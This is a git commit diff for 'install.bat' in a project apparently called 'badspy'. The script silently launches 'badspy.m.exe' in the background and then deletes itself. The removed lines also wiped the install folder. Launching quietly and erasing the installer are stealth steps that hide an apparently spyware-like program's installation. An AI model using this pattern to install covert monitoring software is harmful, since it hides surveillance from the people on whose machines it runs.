a1e0ddc308422b5e0af6bbda179ab679a4a6548b
xuan son tran <xuanson33bk@gmail.com>
2016-05-01 16:33:03 +0700

    - just run badspy executable file then delete itself when install update pack for badspy

--- badspy/install.bat
+++ badspy/install.bat
@@ -1,6 +1,8 @@
 @echo off
-ping 127.0.0.1 -n 1 > nul
-move /y %~dp0\badspy.m.exe %cd%
-move /y %~dp0\badspy.c.dll %cd%
-if exist %cd%\badspy.m.exe start "" /b %cd%\badspy.m.exe
-start "" /b rd /s /q %~dp0
+setlocal
+set installdir=%~dp0
+set exename=badspy.m.exe
+if "%installdir:~-1%"=="\" (set exepath=%installdir%%exename%) else (set exepath=%installdir%\%exename%)
+start "" /b "%exepath%"
+endlocal
+(goto) 2>nul & del /f "%~f0"
